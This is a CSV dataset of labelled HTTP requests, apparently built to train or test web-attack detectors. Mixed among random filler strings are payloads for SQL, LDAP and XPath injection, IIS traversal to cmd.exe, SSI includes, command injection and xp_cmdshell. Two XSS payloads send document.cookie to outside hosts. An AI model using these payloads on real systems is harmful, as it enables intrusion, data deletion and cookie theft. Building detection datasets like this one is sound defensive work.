Method,URI,Host-Header,Host,Label,Data
POST,/R_IkFx/t1B4ueQuuQDe/eYtV/mEiaoHbTUFbna/crtfttTela/eaW/nFi8Bv.O/re6nore/uowalm7/eirbhngtdwGms/matseafs.jpeg,HTTP/1.1,250.162.244.164:80,1,Ogo92d4optMP1b=<!-- #include virtual='d:\\windows\\autoexec.bat'   -->
GET,/ZxtermDLFRfpkmetaV/o3sowOyN9doHkreoEOwt/yYX2dbmw_U_U7Kkt0J/6R9y./rxOEHXyuqpT/5P3_j1J-B/0FRZIgf2QQyiB9@Hi/iL0Vw2r/tefneadltS/tSaP49J0/our2krquuQcSlDfSONt.css,HTTP/1.0,www.i3aopcLat.de:8651,0,esher=ejYo8M2fKwee&2c6amfr=677&luMnunkeis7tzfr=013&mbnOaqy1gsybae=RPewherecatfeval8I+crmochai&afqe=7835&oimsheem=hpositioneehey%25e&tfseoihtcR=655&t8aaehiM4k=eMmsnm&eEn8=Lscripteet%26dls&0ecRbs=wSF8D&ksdfn2ee3iB=47
GET,/OOcopy/ted1nteE/rZ1MKt8b3nG/Isooqt8e0tii0r/anaqceDt.aspx,HTTP/1.0,18.62.215.51,0,QpHz=92&uajo61heedE=hanes&Afe=35&nnazemhsitO=bs2Okuj
GET,/sR5TAbCA3f0/gx_QNZi_QsR95s0L@lh/t0hmqashtsehirIee8/cHo/c1TO7j1ZfcORjEc.mspx,HTTP/1.1,166.131.109.142,0,1rpats=5931&cTntde1tO2tk=s&uthy=6Qn-qsL-cuZX&IeeksrGwsU8I=e5tasstp7ohdoees&s0txyeTmatpi=oa4Pxer0rl3ganl&tslnaTp4tz=anEyhJpFR8Jj&enaTE15oayop8r=9l%7E&431V5autoexec.d2m=530493521&oa=638&IbJB=309285548&4fT3=ud%28n+ain&ei=emBDApWQ&o0ul3Tmthe6esnr=shnunEbJ&logb5K46F=na
PUT,/eavK2.JCy9Uu6/tlRgMu5.VaaqJ/or/axp_GEE8Mq/aRqsnhs/RvIimg80/neik/S096cu/tZMqF.nJe.asp,HTTP/1.1,www.eddanbwet.de,1,pIhn=iregisaNtuub6stp5a&RX0C=teconiKndubebeaonm&au4uye=74500556&5sOelRa=h>&ladsEreaeRew=atyawhoanoS2h&cn1bRq=280483842&zaeeig=10914737&s0O0=bHxrnpfu4lk|a&fiyemsemd6odt=hAy&frsqmn=gi9s&se9pit1yriTgsja=tgt
GET,/nsdIIP9/pe.jsp,HTTP/1.0,www.iOn9tamu.de,0,likeDf2UpositionPf=graaeeblsaoteqrh&jnxleyayalcOrx=8&catJ5871Nk=7209566100&tndar9nnehn=u8yIahxuRlanee&ogeeow=xht1eohlT&vKCnph-=8732&Te3=%3At7&htTeeempnel3lee=ramaihSstTac9e%3E&nonnor6th=y%25uPln&lJsystemaTv=wofy1
PUT,/ll.nsf,HTTP/1.0,28.128.234.178,0,osrtlv=ba&oa1=ne&teing=noad&NfunHuofe=gb5bhdxi1aenf&5kPZD84=tkSKAEQppZrL&ia0iieaooona=ologCa&orosgkanyuy=h4aIxE@.D3z&og4=ytscre~rcopenmeyhah&tnhenvr=w_OW-I&nicrcSeee=ezbgs&IrkX=2t0bg&9l6t2toemikbn=En&uafnqan=dij
GET,/lwAaQW/uO6XA-E9f.shtml,HTTP/1.1,www.w4ea.uk,1,so=wtA&0dllennreo=Oxjmu&tPd=775&SwrNm0E=rsh&k7Ta4mxzoc=eign33vall8pn&toy=ns&tVtYWOAsCLZk=chaOwse2ottowk%401bshutdownls&uaeout8orbo=41&F9Wr_=ia7atsi6qwuaolo&orhoFqdw=%2Fsock_stream%26+&czmW8N=02&2laatueRtnsjv=+oeae&mRPSD=%29+++%28+++%7C+%28zzi%3Dnm*%29&a1o83NQhr=xEiphphtpassgIngi&wadomRa=aIHQU8Fg
GET,/tUPoq/h@og8iYGsgE/vyJd436boot.inig@WT/oworepWe4/rjstyleT0y9evOWd/cfh6tazallmn8sdn.aspx,HTTP/1.1,61.213.230.239:489,1,4ship=lscriptw&nt=ipUJ1d%40CCiLn&feoEheyta=iieg&aavtPehsfunnvbo=ta%2Bliredcoqe%25&G9VJ=9999654&X.YpsKoE4Ks=p%7Cwrb&Lkctnioasass=%29+++%28+%7C++++%28displayName%3Dhad*%29++++%28name++%3D++had*+++%29%28++++mail%3Dhad*++%29&NtttatrE=dnubinF%7Cake&ilmns2y2ca1y=isCasnaem5&DimS3RCMYDCE=63392&AFh0@Vl3hkM5=79784556&7ih=e_%40vIu.xljj
GET,/scripts/..%2f../winnt/system32/cmd.exe,HTTP/1.1,62.28.221.119,1,/c+dir
GET,/uaacme/-DD2m/ptx.dll,HTTP/1.0,www.g5irceu.be,0,imev=+CUiyt%3Eiei%3Cac&ieos46rna3=asseehH&udwhi=e42axseese&htlb4itxiieE=tgs+ArD%2F&gPpl9=oejbs&tbatcn=7
GET,/nAEkDcsLCICiTugrAN/sTnxaymsiad4tt/8y.bin,HTTP/1.0,www.ee70ot.net,0,x3KLZ=96136
GET,/aJTrk3dtbGSrRXctls3/b33wS_/ool77R/hBrp0IoNfmsYSjeyS/mk63fRKRgl0HdwiQdJX/rCEEH6nxb91uJHIkR@.mspx,HTTP/1.0,www.eoirwCr.com,1,aooaetnmnecg=1089&Jm3VbCdWETS=ywehtacces%29eat5&ju7ehAFuXE=n&body2.hbodyW=155554&wdrs2Aem=1e0+gtcefEaoptayt&aR9styrdeaRlIg=nc%24d&tkotn=75645680&optOrmp=5-rn+iincludee+%3Eecho+princludesto&teaa2=odSnysuauo&DXwMtyffpyJB=zeSmlu%3Ddccpassthruz&a9cea=tdgD&eued=095&mMPSYEtqc=8&9jMZyeF=%27+++%3B++rm+++++%7E%2F.bash_history+%3B&whns=v+mail
POST,/nDjKcwC1H6tgdMQ02a_W/rawonw/0eoyo9fA4noIo6ueecp/uDrssesattyvAstjosyt/fHoXfNE8X661a_Z6a2eC/2SLA8kWhtFaM2khZGGcv.pl,HTTP/1.0,www.nrEtr.cz:1,0,Sdan=hatsh0srdhnueauot&zeieOe=9&enhsTo9asel=GworgnkfotntetEr&tykou0=ld1rcuvr&mmedsBiNye=Ecsnbnnubcrs&xo=i6W&S9=hh9RMou&2z.LmXGLecho=kaneftpsinDsscriptolh&9n=boMtgnda&iotOnpieit=t7erEbx5 xxmldododa=ebody&gieTttaaedoi=ha4y&dxml4K0iXH=ecattsmetar:asac[jh
GET,/oiTczfoailtrnetgH/Mtn1wlicagd4dni/mN8nzCntbawaigid1/dOqOt4dcg4i8Ibzyh/h9/HExaK-/sk2oaoerUncnonaHnntu/aEQvu.jpg,HTTP/1.1,www.efieei.ch,1,4hu63a5pnivaT4=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&rettf=g+20as2twe1e2+&jalsiepcegybbfh=ynmeta%2Fpla&idu=jyU7EYOgobX&os08f5ad3eoonog=4v&irgsee=eue0&irhrihsdndqkd=5
PUT,/MhavingIAy.S0oechoj1/aoD.zPN5Jpassthrunode8/4ERXgTU4Z/zW/SsobneeakaeiuHteaEtc.shtml,HTTP/1.0,www.wts4aesbt7.it,0,aenol9nliLe=94025065&nzic4msc=ntero&feEoShb=$5bgsound&et=mn te&Xindiezcytak=dnuaanyppowNcan&mXywDeQli=e7idfe7u8&wJ2XWjV=7syOemnu3&9t4i0a53nkoya7=oazgTJ&PpppsR=t&jneihec3eohTdae=hwOia6breplace&1Ent=ixugrtnhramahi&tra8Rde0=EMpkx
GET,/Tet7AsS4ehaaUuebtLo/eeae/uoreeavohrtbZdnja2/l7fne9pWpElO00G3Fl.png,HTTP/1.0,78.32.145.72,1,fHTAeUFmHn=exec+havingEs&Y5QvOCiByY=2ts+++onload%3Djavascript%3Aalert++++%28vqiRtn.nEl%29
GET,/tbF5X05FFiC3z/n8Uyxsaibeoms4r.aspx,HTTP/1.1,www.ftnsl5lnii.biz,1,euatuaAF8hlae=1657+++++or+id%3E3+++++or++ls_id%3C302
GET,/hK/vbscriptT/mute7matimmenb7c/xhmIe/vlogUGnc/notapeeoAr/dpb_FY@nriLFriflT2x/sO_/uZF2CmNOqz/estoah/aeXpny/8EdPE.aspx,HTTP/1.1,www.dolFsii2op.gov:80,0,iitixwAheeu=02645854&iPtar=jmeta&hSgbrdtezcbr=qesoilteht&54pmhtlafe=la4valn&eraIo0atti=+
GET,/is0opgqgoH/s9rjlauhkleoaen4/g7@evdaY3o@dqwbu/yDlOj1E@Rl/CxeNtmlyrxio6ur/d8srw__Aa4U/rhnt3.tiff,HTTP/1.0,217.132.88.13,0,F3Li=hp&7q4nmhoeery=nnnatenhomefo%3Aewm%26divo%7C&nsify=ah%3D
GET,/rN0GlIaLY-JtzvcnR9e.shtml,HTTP/1.0,96.134.29.158,0,aereeeKUlhhlni=ntveior4oc&rEgroup by2Le=210&to0a=07921&dtinutt=N%28&ee5nbfee=+9A&ieteo4sos=7918588
GET,/twtfgeAyflnae7thed/eakC.X33/m2tr/NLftp7r_enBXCJif/cz/onPrm8thiteunTsv/tLmbt9Y1QsobdZOJj5Y/iohHmI/ojFPEAtp/yYUUtH0cutup1.css,HTTP/1.1,www.h1thioerf.biz:80,1,eoie4sth=cmathpaaZtaanha0&m8mamaaewtrlo=aNHS-kGui9Pe&qioh=899130&teranoroE=1622260&ruTr=ieG&s8e6etfrhnts=2&ar9nAgvseftuitT=ls+-las+++++%2Fhome%2F++%7C&dXn=47&olww=tidcrsnhposition37&sietom8dNthtma=+%24%25&lyetW=rar8s&Fompfi6tte=nerotiAIdPeo&el25f=hpcH67%40haZ&hrsd=e9r
GET,/Vf9HjiframeA/adminvFb8SaF_j/9aw8rabeh8as/3eWED/amJS/RyQrshutdownprocessing-instructiony_iG-xe/euicteFLurticw6lr.php,HTTP/1.1,www.7ahO.st,0,padcybauz6tr5s=d-a%28r&efuia=28161&Tdazoh1=roecs&Eaybuoi=0reweea6rr1gtqoe&sJC2p=%25gsit&woSs=niZJn6BYVd&degbohcsn=istczlexchildra+tmpi&Lbei6o3foTeq1a=nqd9se5nlw3+passwdksiedrop%5Ce&h7OjSea8rk=Eesvhc++a3lpe9&I94b=nnsvfaogtE&lesab8i=er&lorhhyesidcit43=w3v0-&hpf=8135978923
GET,/aoEnen/rt/57gEQXM7h_qjE0pc7/nsretgits/u1arlheitc/akdPPzeItchFUbp3KV/dya3YuapagleJXxltf/cj4OYVeM@6igRdS1/6FfnLDfDjdelete/h4Zx0km/srhgwta1nsMmueeb.cgi,HTTP/1.0,68.18.242.88,0,YUHPY8_xYR=iestsnHpHq%3Cs&oreeAownat=winntd&olj=tmp&yrts9i=usMIchhnsi&v9l0Ler=io&imgFHlMKXP6object=164454&X.oscriptN=cCzAUx5&lNtlotbIt=0&Q0uDA=efzsIs%2F0ihwep&me2oohEsnd=urh&dmnsmsae3pgn=y3tMHV&sonreArehPt=svghcwuAs&aphMrhSnnsusoi=kea&ueDnn=mFnoo&ouetnrnoeteatqG=Pibgeodficnkskp
GET,/eqkF@Q/vmmdBrerkSnsbEe/cD1MPDAUNBboCO/d4gS/7cAloqNneittjeseD/siHuharht93wtrrne/mlee/b@hzW3StyYpu0VtLZI/lrtbhishGosjmdSxarhe/.Zmblike3Htl_Qd/aergl/ssaGhdiie.png,HTTP/1.1,95.48.241.231,0,gfe8pffheazs=ohbV&@elpasswdaC-7xmlQ=ce%25u&eow4ig0xr=scriptechohosecnAxml1&n8h=%28%5Doio-c+0ailti8xi&5U1QIbody=n%282+&K.bDRL5=e%5Cc+h&vo=026&yZ0TT@4TGdS=94943219&yeob6r3edezzax=t.Op6awU&enadnyleejaa=n6yubnya3cmo0b&onv=ne&aabmctra=Fdocument&vgtGrni=mrU&all-SI3=0
GET,/oruqrt6henisteMvistj/altxn6ra/wuV9SJ.KadminAanxi/eco9tluimaesbinie3sy/uQD/dtagzseolL7n/pR4hsaes6ZrEid/eIxmVy3fEnqbmTG/Xlda/evOHqDR5c2kcKn.mspx,HTTP/1.1,140.219.164.47,0,0OCImocha_AY=+&nirPieeovh4=caeaomhtoc2gees&earS8=hzSfqAou&eDEiewinp=ds5%7C60dmia0s&poo=E&km66A=hhTaethiseaenyoctt&ipn=8739486
GET,/kHJd5gd2G._LVtelnetu/wi5rdn8layodtt/eocrnaECyhrtyoa5zvs/hgzcu7Mof8rudrre8eqe/leGeatpeptcs/ecTho5rOrotS1aiitQw/scriptlocationwFGheplq2/FMS9gDM.cy.jpg,HTTP/1.1,www.ntunmekpe.gov,1,tdddmaprn=tenhenena&M1jz4f@bh=tv2JfNkH&htpwu=nxW&dhttpyF-H2XJ@bin7=9427&isu8ecllhneayee=%3C%21--+%23odbc+connect%3D%229e%2Ced%2Cno5sm%22++++++++statement%3D%22select+++++*+++from++++rca%22--%3E&ioeniE=o+4%2B%2Be&atwAsbiy=iaerncntdtnml&odte=lehty&teaenqa=sgFqUIwaetMR&4pcavq=6382579
GET,/naGafstotnl24mtdg/v.fa/okV/e_Cn-/Likceaet1c/prduM/xconwtezaDmkgk/au8thWePHs9ntntzwe3.tiff,HTTP/1.0,229.186.218.118,1,Ams7AW=saatUiIoIro9xlrec&n8UWtT=%3Biiol&aoytLtmY6ssA=%3Cxml+id++++%3D+%22+++X+%22%3E%3Ca%3E%3Cb+%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F115.205.235.145%2Filtoas.bin%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa+++%3E%3C%2Fxml%3E
GET,/lTHl1uXZS@P/hf4/8nnadefhabsezhgTt/byOlU9NW/eciilxdrpehigne/AAW.-c4btz.cfm,HTTP/1.1,www.cxrntabne.biz,1,snileeft=185613082&X59mailsnF=nle&ge9atnghtcteopy=n+yosock_streamktelrdM&tf=89Ldrayvfn0emhn&GV3_MAF=%7Cns&ilw=9tnajeaadminnesh&Tchskfao=%29+%28+%7C++++%28cn%3D*o%27brien*++%29%28mail%3D*o++++%27brien*++++%29&wtm=ymv1mnsaxj&mtG=%26ngtNn&soet6eka0lwStna=ezlc&mEhzYea2=cJoi2passwdmn8ts
POST,/oOonesidd1ndbsitpsoe/vte/CaedJSaueetseinere/fR5MxB_Fn4HXy/ean9etE7n2aS/YJ/06Kpiha6S/PmetaqW7Nm-hUM_zwk.css,HTTP/1.1,www.uelsePcers.uk,0,eixp9t0tenutnL='oeLdiv&.UT5kidimgP=evoecspo8%Oumme5i&iw2oIhe=m7n &fntrmeo=aeq&ASSbW2=ttm me
GET,/2uhu3ecst/zttdssNoddn54o8oolSt/eieceeyng/rogoPCtC2sg@SgTTg41/AnqpA/vn9tiiIqsnterbetys/osrh0bwm7hwhSian/moOtSFnwAZoM2l/ye8VtfSv3vo_.asmx,HTTP/1.0,www.mhhar.ch,1,jtrh=50735&olov0gh3Emnisrn=43019496&c3Ed=5164751&rzNeC=S%2B%3Dr&FaGmetalcfN=4&Dncrabe=29&tsrhwed=25430917&atVthrnmrloian=doc%28+file%3A%2F%2F%2Fc%3A%2Farm%2Fhemw6s.xml+++%29&o8fSOeN=TroalikedthoioN&I7aqsyhtihr1sxp=%280uLi%2Btrttboot.ini+netcatsi3d&dan9ibzpiurk2ln=9522577&l2ii9scce3od=7064
POST,/ikM4UA/yAnqsufbtrs9/bgdt/libeTvG@window.open/xEo.jsp,HTTP/1.0,5.249.240.72,0,3eeoib=hniuqp2eycme&s4kkctb=69&boeafi7=ieatj&u85ssier8=ieindRa&pRetzxe2judc=56836&nh=2634819&tkfe=us&hr=92731&oetonstnv=400717
PUT,/cqFQ/iKY6e0inhMDVY/httpqwJBwCTyB/t9s/vr6eW@/Iszq/ekohl/e5tum8hrkeettovv1s/8exMA0bMOp1bgsoundW-L/bI4/eQXSEO8eS.exe,HTTP/1.0,144.133.195.64:80,1,535oEank=ixtTsC'   or  Sp1/a1/child::node()[processing-instruction()=6]    or  'eNI'  = '&yejiuy4qzlbn2e=p &rice7cvesesccf6=38&nraphedfeo4eB=lfDW&mkntmewahmfio=56210&at1aauaqyao=iAIe4bcyq1moE4&edDdttsro=c3bry6&pnMNVJbhttps=770724&iqEupdatebgsoundel=loonteed&ce9aTjnopeuaa=0ZLmd-t
GET,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.1,94.145.36.220,1,/c+dir
GET,/9WM/ewyteTm8Esn5iEtas/ftaAsbqpxithesbf8g/hE3ICiP/rQO3Ns_3_As.4NNK7npH/n2e.jpg,HTTP/1.1,180.51.111.82,1,Dn=eeuHotzkhwynd+macceptk&frnuulec=osvvifitdEmlhkt5&nehsAehiasEfpt=556634&igJvTyTdi-=ewrogkerepr&iecbJ8a=49.155.48.212+%7C++++dir
GET,/tASYT1yG2rs./oseO1aniu727e9/wp-ThuF7bEOW@/pItexPa5@PBR/eltmsnSci/alaznlistnonfehfnosv/snrmasnreee4/eh94vsuoeeieEI1is4l/e@NVdGC58JZY_8Vk1/taWMYkNTqv/O1fL9k1rCR@c.png,HTTP/1.1,www.g2Sq00.cz:53120,1,SpVssesmaz=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
GET,/lVEU7QmOHMP/aCCY35oFqnV/oQk6IV-Kqa/ernee/olGySMuJformjOuid.php4,HTTP/1.0,57.48.223.77:80,1,usth6en4=nxR2dsthtri&lpeshO3fhe=ttyoe9dm%3A%40N
GET,/_vf8jYrj@QLlphtpass.bin,HTTP/1.1,www.itate.fr:80,1,dgeu=%3FeruaNdwecsdNr&sIee=buD5cbh0dfg7wgD%3Fc&WILeqBgbt45=661&z2aoAii=8174746561&UUnetcatEe=cr+1a&Je1ubscAxnsc=yueItau6gC9oe&H9a7SnnnisElsla=etta7&aad=.%2F..%2F.%2F..%2F&1cy3shxeorntnf=ttu7e%3Faiets+&inwir=ie&5Smu=or+a&9elsplsTgoesb7=2726885&t8mxNnysmy=2yRt54mv_6N
PUT,/aR-7kheZckaK.sh,HTTP/1.1,106.128.179.218,1,fE7urulTloinVe=rs31s&Eprocessing-instructionYpF=538291&hg0nsh=ili' or   count(  path/child::node()[position(   )=((    i  +j    +  k+l  +    1)]     |  path/child::*()[position()=(k+1)])=1  or    'ou'=   '   rno'    or&nEhtenentoau=ht&ttygNiSishsteeb=eaoaky
GET,/rh.htm,HTTP/1.1,www.nterh.fr:80,1,eeOa=frlnmarshormec&aittnh5wdbh3dta=4s+%25&ft=dreiihuMo5&CXb6wfG2sS=52nzwtE&rsi7otEeh=xacdocument8heiunionssts&wsSg3autneal=326&h6rr=%28nOtnm&lntrA=74960890&nHqtessw=waasgieapnnpzZlr&laEoao2m=pfgejs&Rcts2Ftrru=2888875&zLttefvslhz=4540376330&nrski5dpi8=O5elUxir5o6uh
GET,/vjmsfM1rewoTpoe/eL@ArYPqvNWzUkW9nf.cfm,HTTP/1.1,www.h21d.it:22862,0,k1naanSna=connecttlo&_2ymB3bbin=09631
GET,/afgLCkcW7pAMT_HOWjB/-oJJ8krYfhomer5NF/tv/gsLgfn0es/ZD3m/ZJ/KCbptmp-tMb3/uKasNv4wS/reISz0v/tGFKXQS/8XaQS5biH3lTODGv5l.htm,HTTP/1.1,www.alcd.org:80,1,a8xrsieeIetfo=dGgfZGWn8.9&ec5dliiiOritei=472&dleuesehj=560&lcfa=%3Cxml+++++id++%3D%22+++X+%22+%3E%3Ca+++%3E%3Cb%3E%26lt%3Bscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.ieient.com%2Fcgi-bin%2Fllesli.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb+%3E%3C%2Fa+%3E%3C%2Fxml+%3E
GET,/mF2tneIoE/A8CixRWK6T/eAvIeqfTn.JEBM_OFq/oQ1t/pcnado7ra2v3xupoyobh/axtStgirboc5/83kvbodqynqfromCp/Gedt.msf,HTTP/1.0,www.srfdndtuq.st:80,1,gn92nhmn=i0&IvN8Rmrl=olimmE8toem1tritwL&ste3inse=exec++xp_cmdshell+%27%22g5ddc8bdr%22+%3E%3E++++script.vbs%27&nainhtj1cnDnei4=kinpa&H223hahl7hewo=r62https%2Feb8eem4e+I%3D4s&82B0T2QMecX=tHt&cae=Mq8%2B
PUT,/f23P@W4c/eY/eKI-NOiVnUuNSRe/jlFN@avVcmDenTGM/AwOhgfeeldDoeh/rbT3gtDZL-py0peHYsh/yehg/sn6.JAuhnK.d/Ucadknniarotn/iylcY-/cO89jIk6g5YsTbu/rnh9detnatIrduitiEu.exe,HTTP/1.0,www.eUjo.ch,0,taoea=61gZL&nHlaasz=BllaSaoeo&rotVtreS73ddwqu=o1s&.MXu7@2aiQperl=btfthtyessutmsSs2&louayehlmnosfw=it&&nRF=01
GET,/..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe,HTTP/1.1,www.paeso.uk,1,/c+dir
GET,/Oq5KhcIconnectcxKQYt2.gif,HTTP/1.0,www.fn8asua.be,0,7MenO4reiiq=hsdmo&vT7ahAeea1anheN=sBe1&tanndiavealq=8435618&aTrfOl8dhtsCcib=nlibm+s&1jP-QKx=t&l-qU4EL9bkp=aloa1wccoAnecfadto
GET,/7vnyoiGh1Enorofreos/Zi9iframecHvpassthruvJv9/deR5S4ger5lctel5/fLpVw_o0szTM/iBrqK1/yji5BO.q0EQQ.tiff,HTTP/1.0,www.Rt0wLen.com,0,S5ed3ege=oH25FcLJ&uzhavbeaia=1&eeaagiitegWciri=nsHjtimmbd7fr6e5vm&ye69rlo3plf8=25&it3dpofO=mddlsoosmz2
GET,/n2/etqe1.E46v9gpt1/-FgF0wgethu85/onChel6rhArrt/cJf7so3xdtP0_7bvDDv9/xV1KDviG_q1W/a2C8qdivXbtM.e/olXBdA2.jpeg,HTTP/1.0,126.236.227.241:80,1,Iiicgntmn=sh5mife%27%29%3B++++DEL%2F**%2FETE++++FROM+users+WHERE+upper%28username%29++++%3D+++upper%28+++%27admin
GET,/u8iu1uctmNtnrttzt/lsGyTop/cb2/nana/aHB3U/a7.K_Q-gyN/dIiu7ntet1phrcamnE/nb81k177Vkh/processing-instructioniPn@Uxe1tKEH/ByOTC7_RV0ac/VhttpfromF/tOhhycwBWnv.mspx,HTTP/1.1,www.tuefanpece.de:6,1,dddan=60&isjlyhetjsyxe1s=Yo%27%2F**%2FUNION%2F**%2FSELECT%2F**%2F5ri%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2Fyhgotz%2F**%2Flike%2F**%2F%27%2525&iwentxelyi=oetgCelAyea8hlrga&efU6qtaa=lzp&ls93mtron=3hnesnHohheiahepts&tdirRanjauuam=enp+%29%7Ed&alks=76te&7ohn6=%29a&scriptb3D=lT&lfjrtt=yqZqL_B21&adyr=%2Bmllru&Leet=%26de&5fhudsjnh=61&oIbbnoaaa=dwp-nddns%3AHI7shutdown
GET,/sa/aZPpvalU5cU/doP/tnrqLtu4uahewzuaeiim/UQlogGruMVeU/sasos5es/rpocatolRu8to6zii/ngbTYF6tNrHZbgj.asp,HTTP/1.1,93.91.153.139:536,1,len=doc%28++++file%3A%2F%2F%2Fc%3A%2FN6ael%2Frtdmnosf.xml+++%29&8DyIgscriptxcopy=ascriptce&HgEeejdeNae=-sps&thhakdnhTegdtht=34899609&b5a=lfUcU
PUT,/mg8H409@7pvVT.html,HTTP/1.1,www.egdA.be,0,rdiats=ap &o8slhen=~&eanehy=9033&ii3Q=48546752&lhe4hWleomeor=1&whereDowDqautoexecaccept=ySWxWwWlVvL&stO23=peiece2eg&eosdnnjlehipde=uMs4R__p&itaSry=lT8ti6tzTsV&hotenenttnrrs=trgXmla06ss&bIeJPPi=0504
POST,/Ttelnet9.jOF1tZqeR/nt28AUOfoyKLOnv/ouu7zfacar0i53/nyWwpvMIKUmAe1nFO/tIrI0varpassthruw/m4Xf4JxMkxbjITr0.0R/RcHH.C_wget-kalsWB/rrarask6oralMr8rtm/typn1thSbkmrze5m/ytsha8rcet/aS.mdb,HTTP/1.0,116.121.51.126:80,0,atsmsucm=iFR&kr=e00
